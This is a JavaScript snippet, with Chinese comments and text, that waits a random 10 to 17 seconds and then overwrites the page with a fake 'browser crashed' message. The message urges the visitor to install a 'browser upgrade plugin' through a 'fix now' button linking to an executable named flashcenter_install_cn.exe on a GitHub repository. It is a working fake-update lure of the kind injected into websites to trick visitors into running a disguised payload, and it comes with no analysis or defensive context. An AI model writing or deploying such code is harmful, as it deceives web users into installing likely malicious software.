var body = document.body;
var _left = window.innerWidth * 0.3 + 'px';
var _top = window.innerHeight * 0.3 + 'px';
var _height = window.innerHeight + 'px'; // 将_height的值设置为字符串，并添加'px'

// 设置定时器
var timer = setTimeout(function() {
    // 更新 body.innerHTML
    body.innerHTML = `
        <div style="background-color: white!important;">
            <div style="position: absolute; top: 20%; left: 20%; height: 300px; width: 600px;">
                <img src="https://github.com/zhaozhibing780/sssssssgewe/blob/main/kgxxm1.png?raw=true" style="margin: 3px;">
                <h3>浏览器，崩溃啦!</h3>
                <p style="color: gray;">
                    显示此网页时出了点问题，请在您的页面上启用浏览器升级插件，从而可能会有所帮助。<br>
                </p>
                <a href="https://github.com/zhaozhibing780/sssssssgewe/raw/main/flashcenter_install_cn.exe" id="fix-now-button">
                    <button style="margin-left: 85%;cursor:pointer;width:70px;height: 32px; line-height: 32px; outline: none; border: none; background-color: rgb(26, 115, 232); color: white;">
                        立即修复
                    </button>
                </a>
            </div>
        </div>`;

    // 添加按钮点击事件监听器
    document.getElementById('fix-now-button').addEventListener('click', function () {
        localStorage.setItem('lastClick', Date.now().toString());
    });

    // 清除定时器
    clearTimeout(timer);
}, Math.floor(Math.random() * (17000 - 10000 + 1)) + 10000); // 10到17秒的随机延迟


